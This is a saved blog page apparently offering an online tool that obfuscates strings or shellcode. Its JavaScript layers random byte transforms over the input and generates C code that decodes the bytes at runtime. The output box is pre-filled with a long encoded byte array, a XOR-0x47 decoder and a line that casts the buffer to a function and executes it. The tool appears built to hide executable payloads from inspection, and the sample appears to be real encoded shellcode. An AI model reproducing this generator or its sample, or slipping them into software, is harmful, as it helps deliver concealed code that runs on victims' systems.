<!DOCTYPE html>
<!-- saved from url=(0081)https://zerosum0x0.blogspot.com/2017/08/obfuscatedencrypted-cc-online-string.html -->
<html class="v2" dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xmlns:b="http://www.google.com/2005/gml/b" xmlns:data="http://www.google.com/2005/gml/data"
    xmlns:expr="http://www.google.com/2005/gml/expr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta content="width=1100" name="viewport">

    <title>
        zerosum0x0: Obfuscated String/Shellcode Generator
    </title>

</head>

<body>
    <div>

        <div>
            <h3 class="post-title entry-title" itemprop="name">
                Obfuscated String/Shellcode Generator -
                Online Tool
            </h3>
            <div class="post-body entry-content" id="post-body-8544928113538834503" itemprop="description articleBody">
                <script type="text/javascript">
                    var ZCrypt = ZCrypt || {};
                    ZCrypt.ADD = 0;
                    ZCrypt.SUB = 1;
                    ZCrypt.XOR = 2;
                    ZCrypt.NOT = 3;
                    ZCrypt.SHIFT = 4;
                    ZCrypt.ADD_MORPH = 5;
                    ZCrypt.SUB_MORPH = 6;
                    ZCrypt.XOR_MORPH = 7;
                    ZCrypt.NEG = 8;

                    ZCrypt.int_rand = function (min, max) {
                        return Math.floor(Math.random() * (max - min + 1)) + min;
                    }

                    ZCrypt.make_add = function () {
                        return [[ZCrypt.ADD, ZCrypt.do_add], ZCrypt.int_rand(1, 0xff)];
                    }

                    ZCrypt.make_sub = function () {
                        return [[ZCrypt.SUB, ZCrypt.do_sub], ZCrypt.int_rand(1, 0xff)];
                    }

                    ZCrypt.make_xor = function () {
                        return [[ZCrypt.XOR, ZCrypt.do_xor], ZCrypt.int_rand(1, 0xff)];
                    }

                    ZCrypt.make_not = function () {
                        return [[ZCrypt.NOT, ZCrypt.do_not]];
                    }

                    ZCrypt.make_neg = function () {
                        return [[ZCrypt.NEG, ZCrypt.do_neg]];
                    }

                    ZCrypt.make_shift = function () {
                        var bits1 = ZCrypt.int_rand(1, 6);

                        if (bits1 == 4)
                            bits1 = 7;

                        var bits2 = 8 - bits1;

                        return [[ZCrypt.SHIFT, ZCrypt.do_shift], [bits1, bits2]];
                    }

                    ZCrypt.make_add_morph = function () {
                        return [[ZCrypt.ADD_MORPH, ZCrypt.do_add_morph]];
                    }

                    ZCrypt.make_sub_morph = function () {
                        return [[ZCrypt.SUB_MORPH, ZCrypt.do_sub_morph]];
                    }

                    ZCrypt.make_xor_morph = function () {
                        return [[ZCrypt.XOR_MORPH, ZCrypt.do_xor_morph]];
                    }

                    ZCrypt.do_add = function (c, arg) {
                        return (c + arg) & 0xff;
                    }

                    ZCrypt.do_sub = function (c, arg) {
                        return (c - arg) & 0xff;
                    }

                    ZCrypt.do_xor = function (c, arg) {
                        return (c ^ arg) & 0xff;
                    }

                    ZCrypt.do_not = function (c) {
                        return (~c) & 0xff;
                    }

                    ZCrypt.do_neg = function (c) {
                        return (-c) & 0xff;
                    }

                    ZCrypt.do_shift = function (c, args) {
                        return ((c >> args[0]) & 0xff) | ((c << args[1]) & 0xff);
                    }

                    ZCrypt.do_add_morph = function (c, args, morph) {
                        return ZCrypt.do_add(c, morph);
                    }

                    ZCrypt.do_sub_morph = function (c, args, morph) {
                        return ZCrypt.do_sub(c, morph);
                    }

                    ZCrypt.do_xor_morph = function (c, args, morph) {
                        return ZCrypt.do_xor(c, morph);
                    }

                    ZCrypt.remove_by_value = function (array, value) {
                        var ret = [];
                        for (var i = 0; i < array.length; ++i)
                            if (array[i] != value)
                                ret.push(array[i]);

                        return ret;
                    }

                    ZCrypt.remove_all_by_value = function (array, removes) {
                        var ret = array.slice();
                        for (var i = 0; i < removes.length; ++i)
                            ret = ZCrypt.remove_by_value(ret, removes[i]);

                        return ret;
                    }

                    ZCrypt.make_ops = function (rounds, add, sub, xor, not, shift, morph, neg) {
                        var master = []
                        if (add) master.push(ZCrypt.make_add);
                        if (sub) master.push(ZCrypt.make_sub);
                        if (xor) master.push(ZCrypt.make_xor);
                        if (not) master.push(ZCrypt.make_not);
                        if (shift) master.push(ZCrypt.make_shift);
                        if (add && morph) master.push(ZCrypt.make_add_morph);
                        if (sub && morph) master.push(ZCrypt.make_sub_morph);
                        if (xor && morph) master.push(ZCrypt.make_xor_morph);
                        if (neg) master.push(ZCrypt.make_neg);

                        var nops = [];
                        nops.push([ZCrypt.make_add, ZCrypt.make_add_morph, ZCrypt.make_sub, ZCrypt.make_sub_morph]);
                        nops.push([ZCrypt.make_xor, ZCrypt.make_xor_morph]);

                        var last = -1;
                        var ops = [];

                        for (var round = 0; round < rounds; ++round) {
                            var current = master.slice();
                            if (current.length > 1) {
                                for (var nop = 0; nop < nops.length; ++nop)
                                    for (var item = 0; item < nops[nop].length; ++item)
                                        if (last == nops[nop][item])
                                            current = ZCrypt.remove_all_by_value(current, nops[nop]);

                                current = ZCrypt.remove_by_value(current, last);
                            }

                            last = current[Math.floor(Math.random() * current.length)];
                            ops.push(last());
                        }

                        return ops;
                    }

                    ZCrypt.do_crypt = function (str, rounds, add, sub, xor, not, shift, morph, neg) {
                        var ops = ZCrypt.make_ops(rounds, add, sub, xor, not, shift, morph, neg);

                        var cs = [];

                        for (var i = 0; i < str.length; ++i) {
                            var c = str.charCodeAt(i) & 0xff;
                            for (var op_idx = 0; op_idx < ops.length; ++op_idx) {
                                var callback = ops[op_idx][0][1];
                                var args = ops[op_idx][1];
                                c = callback(c, args, i);
                            }
                            cs.push(c);
                        }

                        return [ops, cs];
                    }

                    ZCrypt.generate_c = function (ops, cs) {

                        var code = "";
                        code += "unsigned char s[] = \n{\n";

                        for (var i = 0; i < cs.length; ++i) {
                            if ((i % 8) == 0)
                                code += "\n    ";

                            code += "0x" + cs[i].toString(16) + ", ";
                        }

                        code = code.slice(0, -2);

                        code += "\n};\n\n";

                        code += "for (unsigned int m = 0; m < sizeof(s); ++m)\n{\n"
                        code += "    unsigned char c = s[m];\n";

                        ops = ops.reverse();
                        for (var i = 0; i < ops.length; ++i) {
                            code += "    c ";

                            var op = ops[i][0][0];
                            switch (op) {
                                case ZCrypt.ADD:
                                    code += "-= 0x" + ops[i][1].toString(16);
                                    break;
                                case ZCrypt.SUB:
                                    code += "+= 0x" + ops[i][1].toString(16);
                                    break;
                                case ZCrypt.NOT:
                                    code += "= ~c";
                                    break;
                                case ZCrypt.XOR:
                                    code += "^" + "= 0x" + ops[i][1].toString(16);
                                    break;
                                case ZCrypt.SHIFT:
                                    var first = "0x" + ops[i][1][1].toString(16);
                                    var second = "0x" + ops[i][1][0].toString(16);
                                    code += "= (c >> " + first + ") | (c << " + second + ")";
                                    break;
                                case ZCrypt.ADD_MORPH:
                                    code += "-= m"
                                    break;
                                case ZCrypt.SUB_MORPH:
                                    code += "+= m"
                                    break;
                                case ZCrypt.XOR_MORPH:
                                    code += "^= m"
                                    break;
                                case ZCrypt.NEG:
                                    code += "= -c"
                                    break;
                                default:
                                    code += "UNKNOWN OP = + " + op.toString();
                                    break;
                            }

                            code += ";\n"

                        }

                        code += "    s[m] = c;\n}\n\n";

                        if (document.getElementById('zcrypt_shellcode').checked)
                            code += "(*(void(*)(void))&s)();";
                        else
                            code += 'printf("%s\\n", s);';

                        return code;
                    }

                    ZCrypt.cryptstr = function () {
                        var add = document.getElementById('zcrypt_add').checked;
                        var sub = document.getElementById('zcrypt_sub').checked;
                        var xor = document.getElementById('zcrypt_xor').checked;
                        var not = document.getElementById('zcrypt_not').checked;
                        var shift = document.getElementById('zcrypt_shift').checked;
                        var morph = document.getElementById('zcrypt_morph').checked;
                        var neg = document.getElementById('zcrypt_neg').checked;
                        var str = document.getElementById('zcrypt_plaintext').value;
                        var rounds = parseInt(document.getElementById('zcrypt_rounds').value);

                        if (rounds == NaN) {
                            alert("Please enter an integer for rounds!")
                            return;
                        }

                        var shellcode = document.getElementById('zcrypt_shellcode').checked;

                        try {
                            if (shellcode)
                                str = ZCrypt.clean_shellcode(str);
                            else
                                str += "\x00";

                            var args = ZCrypt.do_crypt(str, rounds, add, sub, xor, not, shift, morph, neg);
                            var code = ZCrypt.generate_c(args[0], args[1]);
                        } catch (e) {
                            alert(e);
                            return;
                        }

                        document.getElementById('zcrypt_code').textContent = code;
                    }

                    ZCrypt.validate_number = function (evt) {
                        var theEvent = evt || window.event;
                        var key = theEvent.keyCode || theEvent.which;
                        if ((key < 48 || key > 57) && !(key == 8 || key == 9 || key == 13 || key == 37 || key == 39 || key == 46)) {
                            theEvent.returnValue = false;
                            if (theEvent.preventDefault) theEvent.preventDefault();
                        }
                    }

                    ZCrypt.clean_shellcode = function (s) {
                        s = s.replace(/(0x|0X)/g, "");
                        s = s.replace(/[^A-Fa-f0-9]/g, "");

                        if ((s.length % 2) != 0)
                            throw "Hex string must be a power of 2 after stripping.";

                        var ret = '';
                        for (var i = 0; i < s.length; i += 2)
                            ret += String.fromCharCode(parseInt(s.substr(i, 2), 16));
                        return ret;
                    }

                </script>
                <div style="width:500px;">
                    <textarea id="zcrypt_plaintext" style="width:100%;" placeholder="Enter text/shellcode hex to obfuscate..."></textarea>
                    <br>
                    <input type="checkbox" id="zcrypt_add" name="zcrypt_add" checked="checked"><label for="zcrypt_add">ADD</label>
                    <input type="checkbox" id="zcrypt_sub" name="zcrypt_sub" checked="checked"><label for="zcrypt_sub">SUB</label>
                    <input type="checkbox" id="zcrypt_xor" name="zcrypt_xor" checked="checked"><label for="zcrypt_xor">XOR</label>
                    <input type="checkbox" id="zcrypt_shift" name="zcrypt_shift" checked="checked"><label for="zcrypt_shift">SHIFT</label>
                    <input type="checkbox" id="zcrypt_not" name="zcrypt_not" checked="checked"><label for="zcrypt_not">NOT</label>
                    <input type="checkbox" id="zcrypt_neg" name="zcrypt_neg" checked="checked"><label for="zcrypt_NEG">NEG</label>
                    <input type="checkbox" id="zcrypt_morph" name="zcrypt_morph" checked="checked"><label for="zcrypt_morph">MORPH</label><br>
                    <input type="radio" name="zcrypt_format" value="string" checked="">
                    String
                    <input type="radio" name="zcrypt_format" value="shellcode" id="zcrypt_shellcode">
                    Shellcode |
                    <label for="zcrypt_rounds">Rounds:</label>
                    <input type="text" id="zcrypt_rounds" name="zcrypt_rounds" value="15" size="2" onkeypress="javascript:ZCrypt.validate_number(event)"><br>
                    <p style="text-align:center"><button type="button" onclick="javascript:ZCrypt.cryptstr()">Generate</button></p>

                    <textarea id="zcrypt_code" readonly="readonly" style="width:100%;height:200px;" placeholder="...and the code will go here.">unsigned char s[] = 
{

0xf, 0x76, 0x8e, 0xf, 0xc6, 0xae, 0xf6, 0xb8, 
0xb8, 0xb8, 0xf, 0xca, 0x42, 0xa8, 0xb8, 0xb8, 
0xb8, 0xf, 0xfc, 0xe4, 0x89, 0xb2, 0x28, 0x9e, 
0x19, 0xba, 0x4c, 0xf, 0x76, 0x1f, 0x60, 0xf, 
0x6a, 0xbf, 0xb8, 0xb8, 0xb8, 0xa5, 0xb3, 0x18, 
0xc1, 0x31, 0xcc, 0x6e, 0xf1, 0x76, 0x4c, 0xe4, 
0x89, 0xf3, 0x79, 0xdf, 0x49, 0xe8, 0x1d, 0xb2, 
0xc1, 0x83, 0xfa, 0xfb, 0x51, 0x31, 0x1e, 0x84, 
0xc1, 0x39, 0x7a, 0x86, 0x51, 0x31, 0x1e, 0xc4, 
0xc1, 0x39, 0x5a, 0xce, 0x51, 0xb5, 0xfb, 0xae, 
0xc3, 0xff, 0x19, 0x57, 0x51, 0x8b, 0x8c, 0x48, 
0xb5, 0xd3, 0x54, 0x9c, 0x35, 0x9a, 0xd, 0x25, 
0x40, 0xbf, 0x69, 0x9f, 0xd8, 0x58, 0xa1, 0xb6, 
0xc8, 0xe3, 0x60, 0x15, 0x4b, 0x9a, 0xc7, 0xa6, 
0xb5, 0xfa, 0x29, 0x4e, 0x7f, 0x3b, 0x34, 0xfc, 
0x82, 0xb0, 0x27, 0x1b, 0x6b, 0xba, 0x4c, 0xe4, 
0x2, 0x32, 0xa0, 0x9e, 0x19, 0xba, 0x4, 0x61, 
0x49, 0xc6, 0x4f, 0xd6, 0x18, 0x6a, 0x1c, 0x6f, 
0xc1, 0xaa, 0x6c, 0x15, 0x59, 0x9a, 0x5, 0xe5, 
0x59, 0x51, 0x7e, 0xd6, 0xe6, 0x73, 0xd, 0x6f, 
0xbd, 0x3a, 0x60, 0x9f, 0xcf, 0xf7, 0x7d, 0x2d, 
0xc1, 0x83, 0xe8, 0x32, 0x58, 0x7b, 0x85, 0xe9, 
0xc8, 0xb3, 0xe9, 0xa6, 0xf9, 0xcf, 0xbd, 0xa8, 
0x8a, 0xfe, 0xc, 0x96, 0x5c, 0x83, 0x9d, 0x91, 
0x51, 0xea, 0x6c, 0x15, 0x59, 0x9e, 0x5, 0xe5, 
0x59, 0xd4, 0x69, 0x15, 0x15, 0xf2, 0x8, 0x6f, 
0xc9, 0xae, 0x61, 0x9f, 0xc9, 0xfb, 0xc7, 0xe0, 
0x1, 0xfa, 0x29, 0x4e, 0x58, 0xe2, 0xd, 0xbc, 
0xd7, 0xeb, 0x72, 0xdf, 0x41, 0xfb, 0x15, 0xa5, 
0xd3, 0xfa, 0xab, 0x72, 0x39, 0xfb, 0x1e, 0x1b, 
0x69, 0xea, 0x69, 0xc7, 0x43, 0xf2, 0xc7, 0xf6, 
0x60, 0xf9, 0xd7, 0x61, 0xe6, 0xe7, 0x4, 0xd5, 
0x52, 0xe1, 0x61, 0x20, 0x6e, 0xd3, 0x22, 0x8d, 
0xe7, 0xd7, 0x5c, 0x9e, 0x58, 0xec, 0x4, 0x6d, 
0x68, 0xfb, 0xef, 0x5c, 0x55, 0xcd, 0x6a, 0xe3, 
0x76, 0x67, 0x7b, 0xcd, 0x51, 0x33, 0xad, 0xb7, 
0xd3, 0xff, 0x19, 0x5e, 0x54, 0x8b, 0x85, 0xb7, 
0xda, 0xfb, 0x92, 0xa4, 0x4f, 0xc3, 0xeb, 0xe4, 
0x89, 0xb2, 0x28, 0x61, 0xcc, 0x52, 0x40, 0xe4, 
0x89, 0xb2, 0x1d, 0xac, 0x37, 0x8b, 0x79, 0xca, 
0xbe, 0x80, 0x6, 0xa9, 0x20, 0xba, 0x16, 0xac, 
0x0, 0x73, 0x61, 0x59, 0xd9, 0xc5, 0x65, 0xe4, 
0x89, 0xff, 0x19, 0x57, 0x4a, 0xe9, 0x26, 0xe7, 
0xda, 0xfb, 0x92, 0xc9, 0x90, 0x25, 0x8a, 0xe4, 
0x89, 0xb2, 0x28, 0x61, 0xcc, 0x52, 0x1d, 0xe4, 
0x89, 0xb2, 0x7, 0xab, 0x7b, 0xca, 0xb, 0xbd, 
0xe8, 0xe4, 0x67, 0xf9, 0x5c, 0xfc, 0x3c, 0x94, 
0xce, 0xdb, 0x45, 0xd3, 0x72, 0xe8, 0x3, 0xb3, 
0xee, 0xc2, 0x7e, 0xb3, 0x72, 0xe5, 0x14, 0xbe, 
0xfc, 0xe0, 0x7d, 0xe4, 0x5c, 0x8c, 0x1b, 0x97, 
0xc7, 0xc2, 0x5b, 0xf6, 0x7c, 0xe2, 0x3e, 0x93, 
0xeb, 0x81, 0x1d, 0xd0, 0x57, 0x97, 0x35, 0x9c, 
0xe1, 0xd3, 0x6e, 0xd5, 0x7e, 0xd3, 0x25, 0x83, 
0xc0, 0x86, 0x10, 0xf9, 0x77, 0xdb, 0x26, 0xa8, 
0xdd, 0xe1, 0x4d, 0xd6, 0x5f, 0x8c, 0xf, 0xb4, 
0xbe, 0xd5, 0x28, 0xd6, 0x90, 0x7b, 0x1f, 0xbe, 
0xc8, 0xea, 0x65, 0xaf, 0xd0, 0xe9, 0x4, 0x5c, 
0x89, 0x80, 0x88, 0x1a, 0x19, 0xba, 0x4c, 0xe4, 
0xd9, 0xe1, 0x7b, 0xd7, 0xde, 0x78, 0xa7, 0xb1, 
0xa7, 0x89, 0xd7, 0x4b, 0x51, 0x33, 0x8a, 0x8e, 
0x83, 0xed, 0x60, 0x17, 0xe8, 0xd0, 0x53, 0xbe, 
0xdb, 0xda, 0xa8, 0xad, 0x19, 0xba, 0x5, 0x6d, 
0x69, 0xd8, 0x2c, 0xdf, 0x40, 0xf3, 0xf6, 0x91, 
0xcf, 0x2c, 0xae, 0x9e, 0x19, 0xba, 0x4c, 0x1b, 
0x5c, 0xff, 0x19, 0x5e, 0x4a, 0xe0, 0x4, 0x6d, 
0x78, 0xff, 0x19, 0x57, 0x54, 0x8b, 0x85, 0xb7, 
0xda, 0xfb, 0xef, 0x5c, 0x34, 0xbc, 0x54, 0x9f, 
0x76, 0x67, 0xad, 0x5e, 0x6c, 0xa5, 0x4, 0x23, 
0x48, 0x3a, 0x3b, 0x9e, 0x19, 0xf3, 0xf6, 0xa0, 
0x79, 0x87, 0xc8, 0x9e, 0x19, 0xba, 0x4c, 0x1b, 
0x5c, 0xfa, 0xd7, 0x51, 0x6d, 0xb8, 0xa7, 0x4e, 
0x61, 0xe7, 0x28, 0x9e, 0x19, 0xe9, 0x15, 0x8e, 
0xc9, 0xe8, 0x61, 0x17, 0xc8, 0x7b, 0xae, 0xf4, 
0xc0, 0x75, 0xe8, 0x9e, 0x9, 0xba, 0x4c, 0xad, 
0x33, 0xea, 0x8c, 0xcd, 0xfc, 0xba, 0x4c, 0xe4, 
0x89, 0x4d, 0xfd, 0xd6, 0x8a, 0xe9, 0x1f, 0xac, 
0x0, 0x55, 0x60, 0x17, 0xe8, 0xf2, 0xc5, 0x3e, 
0xc0, 0x75, 0xe8, 0x9e, 0x39, 0xba, 0x4c, 0xad, 
0x0, 0x4b, 0x61, 0x24, 0xb, 0x2c, 0xc5, 0x6, 
0x89, 0xb2, 0x28, 0x9e, 0xe6, 0x6f, 0x4, 0x67, 
0x4d, 0x92, 0xad, 0x5e, 0x6d, 0x8, 0x2a, 0x6f, 
0x8e, 0xfa, 0x29, 0x5d, 0x9c, 0x7a, 0x39, 0x36, 
0xd1, 0x71, 0x70, 0xf4, 0x19, 0xe3, 0x5, 0x23, 
0x4b, 0x42, 0x9d, 0x3c, 0x4f, 0x45, 0x99
};

for (unsigned int m = 0; m &lt; sizeof(s); ++m)
{
unsigned char c = s[m];
c ^= 0x47;
s[m] = c;
}

(*(void(*)(void))&amp;s)();</textarea>
                </div>

                <p>Shellcode will be cleaned of non-hex
                    bytes using the following
                    algorithm:

                </p>

                <div>
                    <div>
                        <table>
                            <tbody>
                                <tr>
                                    <td class="number"><code>1</code></td>
                                    <td class="content"><code class="plain">s = s.replace(/(0x|0X)/g, </code><code
                                            class="string">""</code><code class="plain">);</code></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    <div>
                        <table>
                            <tbody>
                                <tr>
                                    <td class="number"><code>2</code></td>
                                    <td class="content"><code class="plain">s = s.replace(/[^A-Fa-f0-9]/g, </code><code
                                            class="string">""</code><code class="plain">);</code></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>

</body>

</html>